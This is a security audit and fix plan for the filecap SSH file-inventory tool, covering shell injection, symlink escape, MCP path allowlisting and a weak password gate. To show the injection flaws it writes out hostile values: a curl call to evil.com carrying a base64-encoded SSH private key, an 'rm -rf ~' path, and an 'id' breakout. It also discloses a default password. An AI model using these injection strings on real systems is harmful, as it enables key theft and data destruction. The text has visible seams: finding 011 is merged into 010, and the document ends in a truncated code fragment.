# filecap security audit — 2026-05-10

## Threat model

**Assets worth protecting**
- Auditor's local machine and SSH private key
- Remote Strapi server contents (accessed via SSH but not "owned" by filecap)
- The generated inventory NDJSON / CSV / HTML (may contain internal server paths, hostnames, file names)
- The Netlify-deployed web bundle (intended for managers; not for public)
- The `~/.filecap/sites.json` saved-sites store (server hostnames and remote paths)

**Threat actors**
1. **Insider** — auditor with legitimate SSH access runs filecap against an unintended path (e.g., `/etc/`) or leaks the bundle URL
2. **Compromised remote server** — serves malicious PDFs/Office files designed to exploit the parsing stack; creates symlinks pointing outside the uploads directory
3. **Network MITM** — intercepts the initial `curl audit-remote.sh` fetch, or the `npx @icjia/filecap@latest` install, or the Netlify deployment
4. **Internet stranger** — discovers the Netlify URL (via shoulder-surfing, search engines, link sharing) and reads the inventory HTML
5. **Tampering attacker** — submits a malicious PR to filecap-cli's GitHub repo; poisons the npm package; publishes a typosquatted package
6. **AI agent** — uses the MCP server to run `filecap_scan` against `~/.ssh/` or `/etc/passwd` and exfiltrates the result

**Trust boundaries**
- The auditor's machine is trusted; the remote server is untrusted after any compromise
- User-controlled data (server names, file paths, PDF metadata, filenames) is untrusted and must be escaped before insertion into HTML/CSV
- MCP tool arguments arrive from an AI model and are untrusted

### Critical (fix immediately)

#### FC-2026-001: Shell injection via `REMOTE_PATH` in SSH remote-command string

**File:** `examples/audit-remote.sh` lines 1057–1136  
**Severity:** Critical — arbitrary command execution on the remote server, or on the local machine if the sites.json was tampered with.

**Description:** The remote path is interpolated directly into double-quoted SSH command strings without shell-escaping. A value of `~/uploads; rm -rf ~` would execute two commands on the remote shell. The native-mode scan constructs the SSH command like:

```bash
ssh ... "${SSH_USER}@${HOST}" \
  "npx ... scan '${REMOTE_PATH}' --server-name '${SERVER_NAME}' ..."
```

`REMOTE_PATH` and `SERVER_NAME` are single-quoted inside the outer double-quoted string — this stops word-splitting but does not prevent injection. A value containing `'` will break out of the inner quotes. Example malicious path:

```
~/uploads'; curl https://evil.com/$(cat ~/.ssh/id_rsa | base64) --output /dev/null; echo '
```

**Proof-of-concept:** Set `SERVER_NAME="foo'; id; echo '"` in a saved site, then run audit-remote.sh. The `id` command executes on the remote.

**Fix proposed:** Use `printf %q` to produce shell-safe quoted values before embedding in SSH command strings. Or better, pass arguments via a here-document / stdin to avoid the outer shell expansion entirely.

---

#### FC-2026-002: Shell injection via `REMOTE_PATH` / `path_` / `rpath` in ssh `test -d`, `find`, `du` commands

**File:** `examples/audit-remote.sh` lines 1057, 1060, 1080–1083; `examples/audit-fleet.sh` lines 444, 457; `examples/audit-remote.sh` lines 571, 580  
**Severity:** Critical — same injection vector as FC-2026-001 but against diagnostic commands run before the main scan.

**Description:** Several SSH commands that run `test -d`, `find`, `du`, and `wc -l` on the remote also interpolate `${REMOTE_PATH}` (or `${path_}` / `${rpath}`) without quoting:

```bash
ssh ... "${SSH_USER}@${HOST}" "test -d ${REMOTE_PATH}" 2>/dev/null
ssh ... "${user}@${host}" "du -sh ${path_} 2>/dev/null | cut -f1"
ssh ... "${user}@${host}" "find ${rpath} -type f 2>/dev/null | wc -l"
```

A path containing shell metacharacters (`;`, `$()`, backticks, `|`) executes arbitrary commands on the remote.

**Fix proposed:** Same as FC-2026-001 — shell-quote via `printf %q` before interpolation.

#### FC-2026-003: rsync follows symlinks by default (symlink escape)

**File:** `examples/audit-remote.sh` line 1148  
**Severity:** Moderate — a compromised remote server can create symlinks inside the uploads directory that point to `/etc/passwd`, `~/.ssh/authorized_keys`, or any file readable by the `forge` user. rsync will follow them and write local copies.

**Description:**

```bash
rsync -av --delete --stats \
    "${SSH_USER}@${HOST}:${REMOTE_PATH}/" \
    "${MIRROR_DIR}/"
```

rsync's default is to copy symlinks as symlinks (`-l` implicit in `-a`). Symlinks pointing to absolute paths (e.g., `/etc/shadow`) are preserved and can be followed by later tools. Worse, if the symlink target is readable, rsync copies the target content (behavior depends on `--copy-links` vs `--links`).

**Fix proposed:** Add `--no-links` (treat symlinks as errors, skip them) or `--copy-unsafe-links` with a `--safe-links` pair — but the cleanest fix is `--no-links` so symlinks from the remote never land in the mirror at all.

---

#### FC-2026-004: MCP server `filecap_scan` has no path allowlist

**File:** `src/mcp/tools.js`  
**Severity:** Moderate — an AI agent using the MCP server can pass any absolute path as `directory`, including `~/.ssh/`, `/etc/`, or `~/.filecap/`, and receive a full inventory including file names, sizes, and SHA-256 hashes of sensitive files.

**Description:** `dispatchTool` passes `args.directory` directly to `runScan` with no validation beyond what `fs.stat` provides (the directory must exist). There is no allowlist of permitted scan roots.

**Fix proposed:** Add an env var `FILECAP_MCP_ALLOWED_PATHS` (colon-separated absolute paths). When set, the MCP server rejects any `directory` argument that is not equal to, or a subdirectory of, one of the allowed paths. When the env var is not set, behavior is unchanged (backward-compatible; document the risk).

#### FC-2026-005: Unsalted SHA-256 password gate is trivially crackable

**File:** `src/web/password-gate.js`, `src/web/index-page.js`  
**Severity:** Moderate (documentation/disclosure gap) — the gate is documented as "ward off the curious" in code comments and in the README, but the severity of the weakness is not prominently stated. The default password `icjia60605!!` is a predictable organization-specific string. Any SHA-256 of a short password is crackable via hashcat or online rainbow tables in seconds.

**Description:** `computeHash` produces an unsalted SHA-256 hex. The hash is embedded literally in the HTML. Anyone who can view-source the page can extract it and crack it offline with no rate limiting.

**Fix proposed:** Strengthen the disclaimer in `password-gate.js` and the README to explicitly state:
- The hash is unsalted and can be cracked offline with no rate limiting
- Do not use the client-side gate for any content you would not share publicly if the password were leaked
- Use Netlify Site Password for real enforcement

No code change required beyond comment strengthening; this is a documentation fix.

#### FC-2026-006: `sitesFile` path in `web-rollup` is not validated

**File:** `src/commands/web-rollup.js` line 157  
**Severity:** Moderate — the `--sites-file` CLI argument and `sitesFile` MCP argument are used directly in `fs.readFile(sitesPath)` without checking whether the path is within any expected boundary. An AI agent or a script could pass `/etc/passwd` as `sitesFile` and receive an error message that reveals the first line of the file.

**Description:**

```js
const sitesPath = sitesFile ?? process.env.FILECAP_SITES_FILE
  ?? path.join(os.homedir(), ".filecap", "sites.json");
const raw = await fs.readFile(sitesPath, "utf8");
```

The path is not validated; any readable file can be passed. The JSON.parse that follows will fail, but the error message `SyntaxError: Unexpected token ...` may include file content snippets in some Node versions.

**Fix proposed:** When `sitesFile` is provided, verify it resolves to a path ending in `.json` and that it exists before reading. Log only the path in error messages, not the raw file content.

#### FC-2026-007: sites.json not schema-validated on load

**File:** `src/commands/web-rollup.js` line 169; `examples/audit-remote.sh` Python helpers  
**Severity:** Moderate — if `~/.filecap/sites.json` is modified by an attacker (e.g., another process on the auditor's machine, a supply-chain attack on a tool that writes to home-dir configs), malicious values in `name`, `host`, or `remotePath` fields flow into SSH commands (FC-2026-001/002), HTML output, and the `eval "$loaded"` construct in audit-remote.sh.

**Description:** The `load_saved_site` Python helper outputs shell assignments that are `eval`-ed back into the shell:

```bash
if loaded=$(load_saved_site "$menu_choice"); then
  eval "$loaded"
```

If the JSON contains a site `name` of `foo); malicious_cmd; echo (`, the `shlex.quote` in Python should prevent injection — but there is no schema validation that field values are even strings, or that no unexpected fields exist.

**Fix proposed:** Add a schema validation pass in `web-rollup.js` using zod (already a dependency) that verifies each site entry matches `{ name: string, siteName?: string, user?: string, host?: string, remotePath?: string, publicUrlBase?: string }` and rejects entries with unexpected types or extra fields. In the bash script, `shlex.quote` provides protection, but add a comment documenting the trust chain.

#### FC-2026-008: HTML report XSS — verify `htmlEscape()` covers all injection points

**File:** `src/report/html.js`  
**Severity:** Moderate — if any user-controlled value (PDF title, file path, server name, etc.) lands in the HTML output without escaping, an attacker who can place a malicious PDF on the scanned server can inject `<script>` tags into the generated report.

**Description:** The existing `htmlEscape()` function is applied to row cell values and metadata display values. However, the `jsonData` block (the `<script type="application/json">` embedded data) only has the `</script` termination guard — it does not have full content-security escaping. Malicious content in the JSON block cannot execute directly (JSON does not run), but verifying coverage is still important.

Specific risk: PDF metadata strings like `title`, `author`, `subject`, `keywords` flow through `buildRowValues` → `htmlEscape()` for the table cells, but also through `JSON.stringify` → `jsonData` → the `<script type="application/json">` block. JSON.stringify does not escape `</script>` sequences other than the explicit `.replace()` already present. Verify the existing guard is sufficient.

**Fix proposed:** Add regression tests that use a site name / filename of `<script>alert(1)</script>` and verify the rendered HTML does not contain unescaped angle brackets. Confirm the `</script` replacement guard in `jsonData` is applied correctly (it is, per line 259 in html.js — this is a verification finding, not an active vulnerability).

#### FC-2026-009: `curl audit-remote.sh` initial fetch not verifiable at fetch time

**File:** `examples/audit-remote.sh` comment block  
**Severity:** Low — the self-version-check (SHA-256 of the running script vs. GitHub `main`) detects tampering after the fact but cannot detect a MITM at initial download time. An attacker with MITM capability could serve a backdoored script.

**Description:** The download instruction is:

```
curl -O https://raw.githubusercontent.com/ICJIA/filecap-cli/main/examples/audit-remote.sh
```

HTTPS protects the transport, but GitHub's certificate is the trust anchor. An attacker who can compromise the GitHub certificate or DNS could serve a malicious script. After download, the self-version-check will flag the mismatch on the *next* run.

**Fix proposed (documentation):** Document in the README that to maximize verifiability, auditors can download from a specific commit SHA URL rather than `main`:

```
curl -O https://raw.githubusercontent.com/ICJIA/filecap-cli/<SHA>/examples/audit-remote.sh
```

This is a documentation-only fix; no code change needed.

#### FC-2026-010: `npx --yes @icjia/filecap@latest` accepts any version

**File:** `examples/audit-remote.sh`, `examples/audit-fleet.sh`  
**Severity:** Low — if the npm package is compromised (supply chain) or a typosquatted package is published, `npx --yes @icjia/filecap@latest` will install it silently.

**File:** `examples/audit-remote.sh`  
**Severity:** Low — `~/filecap-audits/` is created without explicit permission setting. Default `mkdir` permissions are `umask`-controlled (typically 755). The inventory NDJSON may contain server hostnames and file paths that are mildly sensitive.

#### FC-2026-012: pdfjs-dist parsing-attack surface

**File:** `src/introspect/pdf.js`  
**Severity:** Low (with current mitigations) — pdfjs-dist has had historical CVEs (e.g., GHSA-wgrm-67xf-hhpq in 2022). The current version (4.10.38) is up-to-date and the call uses `isEvalSupported: false`, which disables the most dangerous attack vector.

**Description:** Parsing untrusted PDFs in a Node.js context with pdfjs-dist exposes the parsing stack to malformed-PDF attacks. Current mitigations: `isEvalSupported: false`, `disableFontFace: true`, `useWorkerFetch: false`, `useSystemFonts: false`. The file is read into a `Uint8Array` and passed to `getDocument()`. There is no sandboxing (no worker subprocess, no container isolation).

**Accepted risk:** No additional mitigation is applied in this release. The correct fix (run pdfjs in a separate worker subprocess or container) is significant future work. Keeping pdfjs-dist pinned to the latest patched release is the primary mitigation.

#### FC-2026-013: jszip / exceljs zip-slip protections

**File:** `src/introspect/docx.js`, `src/introspect/xlsx.js`  
**Severity:** Low — jszip (DOCX, PPTX) and exceljs (XLSX) are vulnerable to zip-slip (path traversal via zip entry names like `../../.bashrc`) if they write extracted files to disk. The current implementation does NOT write files to disk — jszip is used in-memory (`JSZip.loadAsync(data)`; `zip.file("word/document.xml").async("string")`), and exceljs reads directly from the file path without extracting. Therefore zip-slip is not exploitable in the current implementation.

**Fix proposed:** This is a verification finding. Document that the in-memory use pattern is intentional and provides protection against zip-slip. No code change required, but add a comment in `docx.js` and `xlsx.js` noting that files are never written to disk.

#### FC-2026-014: Netlify bundle publicly reachable by URL

**File:** `src/web/netlify-config.js`, `src/web/robots.js`  
**Severity:** Low — the Netlify URL is not secret. `robots.txt` with `Disallow: /` and `X-Robots-Tag: noindex, nofollow` on HTML responses reduce search-engine indexing, but the URL itself could leak via browser history, link sharing, or shoulder-surfing.

**Mitigations already in place:** `robots.txt` disallows all crawlers; all HTML responses have `X-Robots-Tag: noindex, nofollow`; the password gate (client-side or Netlify Site Password) provides additional friction.

**Accepted risk:** There is no additional mitigation applied in this release. The README security section should make clear that the bundle URL itself is not a secret — Netlify Site Password is the recommended protection for content that should not be publicly accessible.

#### FC-2026-015: CSP header missing from netlify.toml

**File:** `src/web/netlify-config.js`  
**Severity:** Low — the netlify.toml does not include a Content-Security-Policy header. The HTML pages contain inline `<script>` blocks, so a strict CSP would require `'unsafe-inline'` anyway, which weakens the protection. However, a CSP that restricts `connect-src`, `img-src`, and `form-action` would still provide defense-in-depth against exfiltration via injected content.

**Fix proposed:** Add a restrictive CSP to `netlify.toml` for `/*.html` responses that allows only inline scripts (required for the existing architecture) but blocks all external connections and form submissions. Defer to future hardening if the inline script approach is ever changed to use a nonce or hash.

### Task 2: Fix FC-2026-001 + FC-2026-002 — Shell injection in SSH commands

**Files:**
- Modify: `examples/audit-remote.sh`
- Modify: `examples/audit-fleet.sh`

The fix is: quote every user-supplied variable that is interpolated into an SSH command string using `printf '%q'`. For the native-mode scan (where variables appear inside a double-quoted string passed to ssh), the cleanest fix is to build a printf-quoted form of each variable and substitute that into the remote command.

- [ ] **Step 2.1: Fix `audit-remote.sh` — all SSH commands that embed path/name variables**

In `audit-remote.sh`, the lines that need fixing are:

1. Lines 1057–1060: `test -d ${REMOTE_PATH}` and `test -r ${REMOTE_PATH}`
2. Lines 1080–1083: `du -sh ${REMOTE_PATH}` and `find ${REMOTE_PATH}`
3. Lines 1123–1136: native-mode scan with `${REMOTE_PATH}`, `${SERVER_NAME}`, `${SITE_NAME}`, `${PUBLIC_URL_BASE}`
4. Lines 571–580 in audit-remote.sh preflight section: `test -d ${rpath}`, `find ${rpath}`, etc.

The fix pattern for each shell variable that goes into an SSH command string:

```bash
# Before (unsafe):
ssh ... "${USER}@${HOST}" "test -d ${REMOTE_PATH}" 2>/dev/null

# After (safe — printf %q escapes shell metacharacters):
QPATH=$(printf '%q' "${REMOTE_PATH}")
ssh ... "${USER}@${HOST}" "test -d ${QPATH}" 2>/dev/null
```

For the native-mode multi-line SSH command, build a quoted-args block before the ssh call:

```bash
QPATH=$(printf '%q' "${REMOTE_PATH}")
QNAME=$(printf '%q' "${SERVER_NAME}")
QHOST=$(printf '%q' "${HOST}")
NATIVE_SITE_ARGS=""
[[ -n "$SITE_NAME" ]] && NATIVE_SITE_ARGS="--site-name $(printf '%q' "${SITE_NAME}")"
NATIVE_PUBURL_ARGS=""
[[ -n "$PUBLIC_URL_BASE" ]] && NATIVE_PUBURL_ARGS="--public-url-base $(printf '%q' "${PUBLIC_URL_BASE}")"

if ! ssh -o ConnectTimeout=30 "${SSH_USER}@${HOST}" \
    "npx --yes @icjia/filecap@latest scan ${QPATH} \
      --server-name ${QNAME} \
      --server-ip ${QHOST} \
      ${NATIVE_SITE_ARGS} \
      ${NATIVE_PUBURL_ARGS} \
      -o -" \
    > "${INVENTORY}" 2> >(grep -v 'Warning:' >&2); then
  die "Remote filecap scan failed."
fi
```

Note: Remove the `# shellcheck disable=SC2029` comment after the fix since the variables are now properly quoted.

Apply the same `printf '%q'` pattern to all other SSH command interpolations:

```bash
# verify remote path
QPATH=$(printf '%q' "${REMOTE_PATH}")
if ! ssh -o ConnectTimeout=10 "${SSH_USER}@${HOST}" "test -d ${QPATH}" 2>/dev/null; then ...
if ! ssh -o ConnectTimeout=10 "${SSH_USER}@${HOST}" "test -r ${QPATH}" 2>/dev/null; then ...

# remote size / count
REMOTE_SIZE=$(ssh -o ConnectTimeout=10 "${SSH_USER}@${HOST}" \
  "LC_ALL=C du -sh ${QPATH} 2>/dev/null | tr -s ' \t' ' ' | cut -d' ' -f1" 2>/dev/null || echo "unknown")
REMOTE_COUNT=$(ssh -o ConnectTimeout=10 "${SSH_USER}@${HOST}" \
  "LC_ALL=C find ${QPATH} -type f 2>/dev/null | wc -l | tr -d ' \t'" 2>/dev/null || echo "?")
```

For the preflight section where `${rpath}` is used:

```bash
QRPATH=$(printf '%q' "${rpath}")
if ! ssh -o ConnectTimeout=10 "${user}@${host}" "test -d ${QRPATH} && test -r ${QRPATH}" 2>/dev/null; then ...
file_count=$(ssh -o ConnectTimeout=10 "${user}@${host}" "find ${QRPATH} -type f 2>/dev/null | wc -l" 2>/dev/null | tr -d '[:space:]')
```

 *
 * @param {string} dir - resolved absolute path to check
 * @returns {string|null}
 */
function checkAllowedPath(dir) {
  const allowedRaw = process.env.FILECAP_MCP_ALLOWED_PATHS;
  if (!allowedRaw) return null; // no restriction
  const allowed = allowedRaw
    .split(":")
    .map((p) => p.trim())

  if (allowed.length === 0) return null;
  for (const root of allowed) {
